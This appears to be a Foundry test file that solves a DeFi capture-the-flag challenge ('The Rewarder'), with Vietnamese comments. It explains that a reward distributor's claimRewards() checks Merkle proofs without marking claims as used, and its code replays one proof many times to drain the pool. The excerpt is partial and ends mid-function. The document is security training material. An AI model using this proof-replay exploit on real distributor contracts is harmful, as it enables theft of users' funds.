...
contract TheRewarderChallenge is Test {
    ...
    /*
    Lỗ hổng
    Hàm claimRewards() không kiểm soát việc một người dùng có thể claim nhiều lần bằng cùng một proof.
    Nó chỉ kiểm tra hợp lệ của Merkle proof chứ không đánh dấu người đã claim
    cho phép claim lặp vô hạn dựa trên cùng dữ liệu hợp lệ.
    Crack
    Đọc danh sách reward của player từ file JSON.
    Dựng lại mảng Claim[] với cùng proof lặp lại nhiều lần cho cả DVT và WETH.
    Gọi claimRewards() một lần để nhận toàn bộ phần thưởng, rồi chuyển hết token về địa chỉ recovery.
     */
    function test_theRewarder() public checkSolvedByPlayer {
        // Đọc file phân phối DVT và WETH từ JSON
        Reward[] memory dvtRewards = abi.decode(
            vm.parseJson(vm.readFile("test/the-rewarder/dvt-distribution.json")), 
            (Reward[])
        );
        Reward[] memory wethRewards = abi.decode(
            vm.parseJson(vm.readFile("test/the-rewarder/weth-distribution.json")), 
            (Reward[])
        );
        
        // Load leaves cho Merkle tree
        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
        
        // Tìm thông tin reward của player
        ...
        require(playerDvtAmount > 0 && playerWethAmount > 0, "Player not found");
        
        // Chuẩn bị danh sách token để claim
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));
        
        // Exploit: Claim nhiều lần bằng cách tái sử dụng Merkle proof
        // Tính số lần claim cần thiết để rút cạn toàn bộ pool
        ...
        // Tạo claims: DVT trước, WETH sau
        for (uint256 i = 0; i < totalClaims; i++) {
            bool isDvt = i < dvtClaims;
            claims[i] = Claim({
                batchNumber: 0,
                amount: isDvt ? playerDvtAmount : playerWethAmount,
                tokenIndex: isDvt ? 0 : 1,
                proof: isDvt ? playerDvtProof : playerWethProof
            });
        }
        
        // Thực hiện claim tất cả rewards
        distributor.claimRewards({
            inputClaims: claims,
            inputTokens: tokensToClaim
        });
        
        // Chuyển toàn bộ token về recovery address
